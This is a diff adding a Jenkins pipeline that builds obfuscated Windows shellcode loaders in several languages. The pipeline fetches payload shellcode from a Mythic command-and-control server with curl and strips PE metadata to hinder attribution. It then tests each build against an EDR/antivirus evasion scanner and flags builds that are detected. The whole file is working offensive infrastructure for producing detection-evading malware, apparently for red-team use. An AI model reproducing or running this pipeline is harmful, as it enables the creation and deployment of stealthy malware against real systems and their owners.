@@ -1,0 +1,237 @@
+pipeline {
+    agent none
+
+    parameters {
+        choice(name: 'LANGUAGE', choices: ['c-mingw', 'c-ollvm', 'go-garble', 'nim', 'csharp'], description: 'Toolchain for compilation')
+        choice(name: 'OUTPUT_FORMAT', choices: ['exe', 'dll', 'shellcode'], description: 'Output format')
+        choice(name: 'OBFUSCATION', choices: ['none', 'ollvm-cff', 'ollvm-bcf-cff', 'ollvm-full', 'garble-literals', 'string-encrypt'], description: 'Obfuscation profile')
+        string(name: 'SHELLCODE_PATH', defaultValue: '', description: 'Path to shellcode binary (relative to repo)')
+        string(name: 'MYTHIC_PAYLOAD_UUID', defaultValue: '', description: 'Mythic payload UUID to fetch shellcode from')
+        booleanParam(name: 'LITTERBOX_SCAN', defaultValue: true, description: 'Submit to LitterBox after build')
+        choice(name: 'SCAN_TYPE', choices: ['all', 'static', 'dynamic', 'edr'], description: 'LitterBox scan profile')
+        booleanParam(name: 'PE_SANITISE', defaultValue: true, description: 'Strip PE metadata post-build')
+    }
+
+    environment {
+        LITTERBOX_URL    = credentials('litterbox-url')
+        LITTERBOX_TOKEN  = credentials('litterbox-token')
+        MYTHIC_URL       = credentials('mythic-url')
+        MYTHIC_API_TOKEN = credentials('mythic-api-token')
+        ARTIFACT_DIR     = "/payloads/${env.BUILD_TAG}"
+    }
+
+    stages {
+        stage('Checkout') {
+            agent { label 'linux-generic' }
+            steps {
+                checkout scm
+                stash includes: '**', name: 'source'
+            }
+        }
+
+        stage('Fetch Mythic Payload') {
+            when { expression { params.MYTHIC_PAYLOAD_UUID?.trim() } }
+            agent { label 'linux-generic' }
+            steps {
+                sh """
+                    mkdir -p shellcode
+                    curl -k -H "apitoken: \${MYTHIC_API_TOKEN}" \\
+                        "\${MYTHIC_URL}/api/v1.4/payloads/download/${params.MYTHIC_PAYLOAD_UUID}" \\
+                        -o shellcode/payload.bin
+                """
+                stash includes: 'shellcode/**', name: 'shellcode'
+            }
+        }
+
+        stage('Build - C/MinGW') {
+            when { expression { params.LANGUAGE == 'c-mingw' } }
+            agent {
+                docker {
+                    image 'maas-builder-c'
+                    label 'linux-c'
+                    args '-v /payloads:/payloads'
+                }
+            }
+            steps {
+                unstash 'source'
+                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
+                sh """
+                    x86_64-w64-mingw32-gcc -o loader.${params.OUTPUT_FORMAT == 'dll' ? 'dll' : 'exe'} \\
+                        src/loader.c \\
+                        ${params.OUTPUT_FORMAT == 'dll' ? '-shared' : ''} \\
+                        -lntdll -lkernel32 -mwindows -s -O2
+                """
+                stash includes: "loader.*", name: 'artifact'
+            }
+        }
+
+        stage('Build - C/OLLVM') {
+            when { expression { params.LANGUAGE == 'c-ollvm' } }
+            agent {
+                docker {
+                    image 'maas-builder-c'
+                    label 'linux-c'
+                    args '-v /payloads:/payloads'
+                }
+            }
+            steps {
+                unstash 'source'
+                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
+                script {
+                    def ollvmFlags = ''
+                    switch (params.OBFUSCATION) {
+                        case 'ollvm-cff':
+                            ollvmFlags = '-mllvm -fla'; break
+                        case 'ollvm-bcf-cff':
+                            ollvmFlags = '-mllvm -fla -mllvm -bcf'; break
+                        case 'ollvm-full':
+                            ollvmFlags = '-mllvm -fla -mllvm -bcf -mllvm -sub'; break
+                        default:
+                            ollvmFlags = ''; break
+                    }
+                    sh """
+                        clang --target=x86_64-w64-mingw32 \\
+                            ${ollvmFlags} \\
+                            -o loader.${params.OUTPUT_FORMAT == 'dll' ? 'dll' : 'exe'} \\
+                            src/loader.c \\
+                            ${params.OUTPUT_FORMAT == 'dll' ? '-shared' : ''} \\
+                            -lntdll -lkernel32 -s -O1
+                    """
+                }
+                stash includes: "loader.*", name: 'artifact'
+            }
+        }
+
+        stage('Build - Go/Garble') {
+            when { expression { params.LANGUAGE == 'go-garble' } }
+            agent {
+                docker {
+                    image 'maas-builder-go'
+                    label 'linux-go'
+                    args '-v /payloads:/payloads'
+                }
+            }
+            steps {
+                unstash 'source'
+                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
+                sh """
+                    GOOS=windows GOARCH=amd64 \\
+                    garble -literals -tiny build \\
+                        -o loader.exe -ldflags="-s -w" \\
+                        ./cmd/loader
+                """
+                stash includes: 'loader.exe', name: 'artifact'
+            }
+        }
+
+        stage('Build - Nim') {
+            when { expression { params.LANGUAGE == 'nim' } }
+            agent {
+                docker {
+                    image 'maas-builder-nim'
+                    label 'linux-nim'
+                    args '-v /payloads:/payloads'
+                }
+            }
+            steps {
+                unstash 'source'
+                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
+                sh """
+                    nim c -d:mingw -d:release -d:strip \\
+                        --opt:size --app:gui \\
+                        -o:loader.exe src/loader.nim
+                """
+                stash includes: 'loader.exe', name: 'artifact'
+            }
+        }
+
+        stage('Build - C#') {
+            when { expression { params.LANGUAGE == 'csharp' } }
+            agent { label 'windows-dotnet' }
+            steps {
+                unstash 'source'
+                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
+                bat """
+                    dotnet publish src\\Loader.csproj ^
+                        -c Release -r win-x64 ^
+                        --self-contained true ^
+                        -p:PublishSingleFile=true ^
+                        -p:PublishTrimmed=true ^
+                        -o .
+                """
+                stash includes: 'Loader.exe', name: 'artifact'
+            }
+        }
+
+        stage('PE Sanitisation') {
+            when { expression { params.PE_SANITISE } }
+            agent { label 'linux-generic' }
+            steps {
+                unstash 'artifact'
+                sh """
+                    python3 tools/pe-sanitise.py loader.* \\
+                        --strip-rich --randomise-timestamp \\
+                        --strip-debug --strip-version-info
+                """
+                stash includes: "loader.*", name: 'sanitised'
+            }
+        }
+
+        stage('Checksum') {
+            agent { label 'linux-generic' }
+            steps {
+                script {
+                    try { unstash 'sanitised' } catch (e) { unstash 'artifact' }
+                }
+                sh 'sha256sum loader.* > checksums.sha256'
+                stash includes: 'loader.*,checksums.sha256', name: 'final'
+            }
+        }
+
+        stage('LitterBox Scan') {
+            when { expression { params.LITTERBOX_SCAN } }
+            agent { label 'linux-generic' }
+            steps {
+                unstash 'final'
+                sh """
+                    grumpycats submit \\
+                        --url "\${LITTERBOX_URL}" \\
+                        --token "\${LITTERBOX_TOKEN}" \\
+                        --scan-type "${params.SCAN_TYPE}" \\
+                        --file loader.* \\
+                        --wait --timeout 300 \\
+                        --output results.json
+                """
+                script {
+                    def results = readJSON file: 'results.json'
+                    def risk = results.risk_level
+                    echo "LitterBox Verdict: ${risk}"
+                    if (risk == 'critical' || risk == 'high') {
+                        unstable("Payload flagged: ${risk} risk")
+                    }
+                }
+                archiveArtifacts artifacts: 'results.json'
+            }
+        }
+
+        stage('Archive') {
+            agent { label 'linux-generic' }
+            steps {
+                unstash 'final'
+                sh """
+                    mkdir -p "\${ARTIFACT_DIR}"
+                    cp loader.* checksums.sha256 "\${ARTIFACT_DIR}/"
+                """
+                archiveArtifacts artifacts: 'loader.*,checksums.sha256'
+            }
+        }
+    }
+
+    post {
+        always {
+            node('linux-generic') {
+                cleanWs()
+            }
+        }
+    }
+}
